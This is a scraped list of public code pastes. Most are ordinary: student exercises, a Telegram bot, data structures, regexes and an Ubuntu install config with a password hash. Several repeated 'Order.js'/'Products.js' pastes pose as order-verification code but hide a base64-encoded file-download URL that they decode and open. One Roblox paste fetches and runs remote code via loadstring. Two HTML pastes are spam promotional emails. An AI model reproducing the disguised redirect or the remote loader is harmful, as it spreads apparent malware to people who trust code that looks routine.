          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TCFwDWNf,Untitled,robloxhack212,JavaScript,Thursday 3rd of April 2025 05:32:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/938/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sBYi2ciX,Untitled,HytheCoderDojo,Python,Thursday 3rd of April 2025 05:11:05 AM CDT,#  Turtle code saving area - NO PERSONAL DETAILS
dkT98jWR,Products.js,robloxhack212,JavaScript,Thursday 3rd of April 2025 04:57:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/414/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jUfg0Pem,autoinstall.yaml,liblaf,YAML,Thursday 3rd of April 2025 04:20:24 AM CDT,"#cloud-config
autoinstall:
  version: 1
  refresh-installer:
    update: true
  source:
    search_drivers: true
    id: ubuntu-desktop-minimal
  storage:
    layout:
      name: zfs
  identity:
    username: liblaf
    hostname: Ubuntu
    password: $1$4gDKKqSk$.mKsydtUuM9ofc2O1fKtm1
  ssh:
    install-server: true
    authorized-keys:
      - ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBwTNJyOkeKeZ03+rdwsnUcjvBh53GoIo7jV/LIv1hOG 30631553+liblaf@users.noreply.github.com
    allow-pw: false
  codecs:
    install: true
  drivers:
    install: true
  oem:
    install: auto
  snaps:
    - name: chezmoi
      classic: true
  packages:
    - flatpak
  timezone: Asia/Shanghai
  updates: all"
EVqAnqz8,Products.js,robloxhack212,JavaScript,Thursday 3rd of April 2025 03:56:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/354/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5uVgZEDZ,Perplexity Make And Select Table.,IgorKan,Lua,Thursday 3rd of April 2025 03:53:15 AM CDT,"-- Объединение таблиц
local merged = {}
for k, v in pairs(node.info(""hw"")) do merged[k] = v end
for k, v in pairs(node.info(""sw_version"")) do merged[k] = v end

-- Фильтрация по требуемым ключам
local target_keys = { 'flash_id', 'chip_id', 'git_commit_dts' }
local result = {}
for _, key in ipairs(target_keys) do result[key] = merged[key] end
 "
NybNDSb7,Order.js,robloxhack212,JavaScript,Thursday 3rd of April 2025 03:40:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/977/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sDsvzWzB,GuessTheNumber,frecnbr,Python,Thursday 3rd of April 2025 03:24:52 AM CDT,"import tkinter as tk
from tkinter import messagebox
from random import randint

# Функция для перезапуска игры
def restart_game():
    global input_number1, attempts
    input_number1 = randint(1, 100)  # Генерируем новое число
    attempts = 0  # Обнуляем счетчик попыток
    label_out.delete(0, tk.END)  # Очищаем поле ввода
    label_pods.config(text="""")  # Очищаем текст подсказки

# Функция для проверки числа
def otg():
    global attempts 
    attempts += 1
    try:
        label_out1 = int(label_out.get())  # Получаем число из ввода
    except ValueError:
        messagebox.showerror(""Ошибка"", ""Введите число!"")
        return

    if input_number1 > label_out1:
        label_pods.config(text=""Загаданное число больше"")
    elif input_number1 < label_out1:
        label_pods.config(text=""Загаданное число меньше"")
    else:
        messagebox.showinfo(""Победа"", f""Правильно, это число {input_number1}. Потрачено попыток {attempts}."")
        restart_game()  # Перезапускаем игру после победы

# Создание окна
window = tk.Tk()
window.title(""FindNumber 1.0"")
window.geometry('350x300')

frame = tk.Frame(window, padx=10, pady=10)
frame.pack(expand=True)

input_number1 = randint(1, 100)
attempts = 0

label_in = tk.Label(frame, text=""Отгадай число"")
label_in.grid(column=1, row=2)

label_out = tk.Entry(frame)
label_out.grid(column=2, row=2)
label_out.focus()

label_pods = tk.Label(frame, text="""")
label_pods.grid(column=1, row=1)

# Кнопка для ввода числа
button_enter = tk.Button(frame, text=""Enter"", command=otg)
button_enter.grid(column=3, row=2)

# Кнопка ""Играть снова""
button_restart = tk.Button(frame, text=""Играть снова"", command=restart_game)
button_restart.grid(column=1, row=3)

# Кнопка ""Выход""
button_exit = tk.Button(frame, text=""Выход"", command=window.quit)
button_exit.grid(column=2, row=3)

window.mainloop()
"
wR23QaGB,Werde ein Trucker im Update des Grand RP Jobs,Shpindlier,HTML,Thursday 3rd of April 2025 03:22:43 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/Uny8bGm.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td>
						<p style=""color: #fff; font-family: 'Arial'; font-size: 44px; letter-spacing: 0.01em; line-height: 40px; text-decoration: none; width: 500px; padding: 0px 0px 0px 34px;""><strong>Trucker Job: ein neues Leben</strong></p>
					</td>
				</tr>
			</tbody>
			<tbody>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Nachdem ich aufgestanden bin und meinen ersten Kaffe gemacht habe, war ich schockiert über die Neuigkeiten darüber, was auf Grand RP passiert ist! Ihr werdet es nicht glauben, aber die Entwickler haben den Trucker Job erneuert, Leute das müsst ihr sehen. Darüber hinaus gibt es ein neues Event und viele andere Änderungen auf Grand RP.<br><br><strong>Natürlich auch eine Promotion, dank derer ihr für eure Online Zeit 15 Grand Coins bekommen könnt.</strong></p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td align=""center"">
						<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
HsZe9HRn,Become a trucker on the updated Grand RP job,Shpindlier,HTML,Thursday 3rd of April 2025 03:14:08 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/Uny8bGm.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td>
						<p style=""color: #fff; font-family: 'Arial'; font-size: 44px; letter-spacing: 0.01em; line-height: 40px; text-decoration: none; width: 500px; padding: 0px 0px 0px 34px;""><strong>Trucker job: New life</strong></p>
					</td>
				</tr>
			</tbody>
			<tbody>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">After waking up and making my first cup of coffee, I was shocked by the news that happened on Grand RP! You won't believe it, but the developers have <strong>redone the trucker job, you absolutely need to see it.</strong> Moreover, there is a new event and many other changes on Grand RP.<br><br><strong>Also a promotion thanks to which, for online time you can get 15GC.</strong></p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td align=""center"">
						<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
i26iEMjn,Disjoint Set Union,milon34,C++,Thursday 3rd of April 2025 02:56:15 AM CDT,"struct DSU {
    vector<int> par, rnk;
    DSU(int n) : par(n + 1), rnk(n + 1, 1) {
        for (int i = 0; i < par.size(); i++) par[i] = i;
    }
    int find(int v) {
        return (par[v] == v) ? v : (par[v] = find(par[v]));
    }
    void uni(int a, int b) {
        a = find(a), b = find(b);
        if (a != b) {
            if (rnk[a] < rnk[b]) swap(a, b);
            par[b] = a;
            rnk[a] += rnk[b];
        }
    }
};
 "
hVzcXteA,Untitled,NukeVsCity,Lua,Thursday 3rd of April 2025 02:56:10 AM CDT,"Problema 8, 10p

#include <iostream>

class Deque {
private:
    int* data;
    int capacity;
    int front;
    int back;
    int count;

    void redimensioneaza() {
        int new_capacity = capacity * 2;
        int* new_data = new int[new_capacity];

        for (int i = 0; i < count; ++i) {
            new_data[i] = data[(front + i) % capacity];
        }

        delete[] data;
        data = new_data;
        capacity = new_capacity;
        front = 0;
        back = count;
    }

public:
    Deque(int initial_capacity = 4) {
        capacity = initial_capacity;
        data = new int[capacity];
        front = 0;
        back = 0;
        count = 0;
    }

    ~Deque() {
        delete[] data;
    }

    void adauga_sfarsit(int value) {
        if (count == capacity) {
            redimensioneaza();
        }
        data[back] = value;
        back = (back + 1) % capacity;
        count++;
    }

    void adauga_inceput(int value) {
        if (count == capacity) {
            redimensioneaza();
        }
        front = (front - 1 + capacity) % capacity;
        data[front] = value;
        count++;
    }

    void scoate_sfarsit() {
        if (count == 0) return;
        back = (back - 1 + capacity) % capacity;
        count--;
    }

    void scoate_inceput() {
        if (count == 0) return;
        front = (front + 1) % capacity;
        count--;
    }

    int marime() {
        return count;
    }

    bool e_gol() {
        return count == 0;
    }

    int la_pozitie(int index) {
        if (index < 0 || index >= count) return -1;
        return data[(front + index) % capacity];
    }

    void insereaza(int index, int value) {
        if (index < 0 || index > count) return;

        if (count == capacity) {
            redimensioneaza();
        }

        if (index < count / 2) {
            front = (front - 1 + capacity) % capacity;
            for (int i = 0; i < index; ++i) {
                data[(front + i) % capacity] = data[(front + i + 1) % capacity];
            }
            data[(front + index) % capacity] = value;
        } else {
            for (int i = count; i > index; --i) {
                data[(front + i) % capacity] = data[(front + i - 1) % capacity];
            }
            data[(front + index) % capacity] = value;
            back = (back + 1) % capacity;
        }

        count++;
    }

    void sterge(int index) {
        if (index < 0 || index >= count) return;

        if (index < count / 2) {
            for (int i = index; i > 0; --i) {
                data[(front + i) % capacity] = data[(front + i - 1) % capacity];
            }
            front = (front + 1) % capacity;
        } else {
            for (int i = index; i < count - 1; ++i) {
                data[(front + i) % capacity] = data[(front + i + 1) % capacity];
            }
            back = (back - 1 + capacity) % capacity;
        }

        count--;
    }
};

int main() {
    Deque d;

    d.adauga_sfarsit(10);
    d.adauga_inceput(20);
    d.adauga_sfarsit(30);

    std::cout << ""la_pozitie(0): "" << d.la_pozitie(0) << ""\n"";
    std::cout << ""la_pozitie(1): "" << d.la_pozitie(1) << ""\n"";
    std::cout << ""la_pozitie(2): "" << d.la_pozitie(2) << ""\n"";

    d.insereaza(1, 99);
    std::cout << ""dupa insereaza la 1: "" << d.la_pozitie(1) << ""\n"";

    d.sterge(2);
    std::cout << ""dupa sterge la 2: "" << d.la_pozitie(2) << ""\n"";

    return 0;
}"
SB0V6TCj,Untitled,Hasli4,Python,Thursday 3rd of April 2025 02:06:49 AM CDT,"# -*- coding: utf-8 -*-
""""""
Полноценная реализация чат-бота для Telegram.
Бот обрабатывает входящие сообщения следующим образом:
1. Получает сообщение от пользователя.
2. С помощью NLTK:
   - Токенизирует текст,
   - Удаляет стоп-слова,
   - Оставляет только слова (без знаков препинания и чисел).
3. Приводит слова к нормальной форме (лемматизация) с помощью spaCy.
4. Загружает таблицу ""Лекарства.xlsx"" с данными (предполагается, что в первой колонке находятся названия лекарств).
5. Для каждого лемматизированного токена производит поиск по столбцам таблицы и подсчитывает количество совпадений.
6. Если совпадения обнаружены только в первом столбце – выводит список лекарств (уникальные значения найденных строк).
7. В противном случае – сообщает, что условие не выполнено.
8. Бот также обрабатывает стандартные команды /start, /help и команду ""Выход"" для завершения работы.
""""""

import telebot
import pandas as pd
import nltk
from nltk.tokenize import word_tokenize
from nltk.corpus import stopwords
import spacy

# Загружаем необходимые ресурсы NLTK
nltk.download('punkt')
nltk.download('stopwords')

# Загружаем spaCy модель для русского языка
# Для корректной работы требуется модель ""ru_core_news_md"" (ее можно установить командой: python -m spacy download ru_core_news_md)
nlp = spacy.load(""ru_core_news_md"")

# Загружаем Excel-файл с лекарствами.
# Файл ""Лекарства.xlsx"" должен находиться в рабочем каталоге.
try:
    df = pd.read_excel(""Лекарства.xlsx"")
except Exception as e:
    print(""Ошибка при загрузке файла Excel:"", e)
    df = None

# Инициализация Telegram-бота (укажите свой токен)
bot = telebot.TeleBot('ВАШ_ТОКЕН_ЗДЕСЬ')  # замените 'ВАШ_ТОКЕН_ЗДЕСЬ' на реальный токен

def process_message(text):
    """"""
    Обработка входящего текста:
    1. Приведение к нижнему регистру.
    2. Токенизация с помощью NLTK.
    3. Удаление стоп-слов и оставление только буквенных токенов.
    4. Лемматизация с помощью spaCy.
    
    Возвращает список нормализованных токенов (лемм).
    """"""
    # Приводим текст к нижнему регистру
    text = text.lower()
    # Токенизируем текст
    tokens = word_tokenize(text, language=""russian"")
    # Фильтруем токены: оставляем только слова и удаляем стоп-слова
    filtered_tokens = [token for token in tokens if token.isalpha() and token not in stopwords.words(""russian"")]
    # Лемматизация с помощью spaCy: объединяем токены в строку и анализируем
    doc = nlp("" "".join(filtered_tokens))
    lemmas = [token.lemma_ for token in doc]
    return lemmas

def search_tokens_in_table(tokens, dataframe):
    """"""
    Ищет в таблице совпадения по каждому столбцу для списка токенов.
    
    Параметры:
        tokens: список нормализованных токенов (строк)
        dataframe: объект pandas.DataFrame, загруженный из Excel
        
    Возвращает:
        col_matches: словарь, где ключ – имя столбца, значение – количество совпадений
        col_matches_rows: словарь, где ключ – имя столбца, значение – список индексов строк,
                          в которых обнаружены совпадения.
    """"""
    col_matches = {col: 0 for col in dataframe.columns}
    col_matches_rows = {col: [] for col in dataframe.columns}
    
    # Для каждого токена ищем его наличие в каждой ячейке таблицы
    for token in tokens:
        for col in dataframe.columns:
            for idx, value in dataframe[col].iteritems():
                if pd.notnull(value):
                    # Приводим значение ячейки к строке, приводим к нижнему регистру и проверяем наличие токена
                    if token in str(value).lower():
                        col_matches[col] += 1
                        col_matches_rows[col].append(idx)
    return col_matches, col_matches_rows

# Определяем функцию для ветвления логики в зависимости от результатов поиска
def analyze_results(col_matches, col_matches_rows, dataframe):
    """"""
    Анализирует результаты поиска.
    Если совпадения есть только в первом столбце, возвращает список лекарств по найденным индексам.
    Иначе возвращает сообщение о том, что условие не выполнено.
    """"""
    # Предполагаем, что первый столбец содержит названия лекарств
    primary_col = dataframe.columns[0]
    other_cols = [col for col in dataframe.columns if col != primary_col]
    
    # Если в первом столбце есть совпадения и в остальных нет
    if col_matches[primary_col] > 0 and all(col_matches[col] == 0 for col in other_cols):
        # Получаем уникальные значения (названия лекарств) для найденных строк
        matched_indices = set(col_matches_rows[primary_col])
        drugs = dataframe.loc[matched_indices, primary_col].unique()
        return ""Найденные лекарства: "" + "", "".join([str(drug) for drug in drugs])
    else:
        return ""Результаты поиска не удовлетворяют условию (совпадения обнаружены не только в первом столбце).""

# Обработчик команд /start и /help
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, 'Привет! Чем могу помочь? Напиши ""Выход"" для завершения работы.')

# Обработчик текстовых сообщений
@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    # Если пользователь пишет ""Выход"", завершаем работу бота
    if message.text.strip().lower() == ""выход"":
        bot.send_message(message.from_user.id, ""Бот завершает работу. До свидания!"")
        exit_program()
        return

    # Обрабатываем входящий текст: нормализация и лемматизация
    tokens = process_message(message.text)
    print(""Обработанные токены:"", tokens)
    
    # Если таблица не загружена, выводим сообщение об ошибке
    if df is None:
        bot.send_message(message.from_user.id, ""Ошибка: не удалось загрузить таблицу с данными."")
        return

    # Производим поиск токенов в таблице
    col_matches, col_matches_rows = search_tokens_in_table(tokens, df)
    print(""Совпадения по столбцам:"", col_matches)
    
    # Анализируем результаты поиска
    result = analyze_results(col_matches, col_matches_rows, df)
    
    # Отправляем ответ пользователю
    bot.send_message(message.from_user.id, result)

def exit_program():
    """"""
    Функция для завершения работы бота.
    """"""
    print(""Завершение работы программы..."")
    bot.stop_polling()
    quit()

# Запуск бота в режиме polling (постоянное прослушивание сообщений)
if __name__ == ""__main__"":
    print(""Запуск бота..."")
    bot.polling(none_stop=True, interval=0)
"
mfJ99cDk,Order.js,reflezzzz,JavaScript,Thursday 3rd of April 2025 01:37:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/083/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
brAyGydG,[ARISE] Anime Smash Simulator Script,drocher4,Lua,Thursday 3rd of April 2025 01:20:00 AM CDT,loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/vbbdv3/ENG/refs/heads/main/Anime%20Smash%20Simulator'))()
4qDjrz1V,Untitled,Xinef,Python,Thursday 3rd of April 2025 01:07:10 AM CDT,"import math


# dla zadanych wierzchołków trójkąta (Ax, Ay), (Bx, By), (Cx, Cy)
# wylicz i zwróć powierzchnię trójkąta
def powierzchniaTrojkata(Ax: float, Ay: float, Bx: float, By:float, Cx: float, Cy: float):
  return 0



# dla zadanych wierzchołków trójkąta (Ax, Ay), (Bx, By), (Cx, Cy)
# oraz dla podanego punktu (Px, Py)
# sprawdź czy punkt P leży w trójkącie poprzez porównanie powierzchni trójkątów
# ABC == ABP + ACP + BCP
# jeśli tak, zwróć True, jeśli nie, zwróć False
def czyWTrojkacie(Ax: float, Ay: float, Bx: float, By:float, Cx: float, Cy: float, Px: float, Py: float):
  return False



if __name__ == '__main__':
  print(""Podaj x i y pierwszego wierzchołka trójkąta: "")
  Ax = float(input())
  Ay = float(input())
  print(""Podaj x i y drugiego wierzchołka trójkąta: "")
  Bx = float(input())
  By = float(input())
  print(""Podaj x i y trzeciego wierzchołka trójkąta: "")
  Cx = float(input())
  Cy = float(input())

  print(""Podaj x i y sprawdzanego punktu: "")
  Px = float(input())
  Py = float(input())


  print(""Trójkąt ("", Ax, "", "", Ay, "")"", ""("", Bx, "", "", By, "")"", ""("", Cx, "", "", Cy, "")"")
  print(""Punkt ("", Px, "", "", Py, "")"")

  print(""Powierzchnia trojkata = "", powierzchniaTrojkata(Ax, Ay, Bx, By, Cx, Cy))
  print(""Powierzchnia trojkataABP = "", powierzchniaTrojkata(Ax, Ay, Bx, By, Px, Py))
  print(""Powierzchnia trojkataACP = "", powierzchniaTrojkata(Ax, Ay, Cx, Cy, Px, Py))
  print(""Powierzchnia trojkataBCP = "", powierzchniaTrojkata(Bx, By, Cx, Cy, Px, Py))

  if(czyWTrojkacie(Ax, Ay, Bx, By, Cx, Cy, Px, Py)):
    print(""Punkt leży w trójkącie"")
  else:
    print(""Punkt NIE leży w trójkącie"")"
zXMDHr2Q,Testing DW,antonio_pedro,Python,Thursday 3rd of April 2025 12:52:07 AM CDT,"^(?=.*antonio)(?=.*pedro).*

(?i)^.*antonio.*pedro.*|^.*pedro.*antonio.*

(?i)^(?=.*antonio)(?=.*pedro).*

^(?=.*[Aa][Nn][Tt][Oo][Nn][Ii][Oo])(?=.*[Pp][Ee][Dd][Rr][Oo]).*"
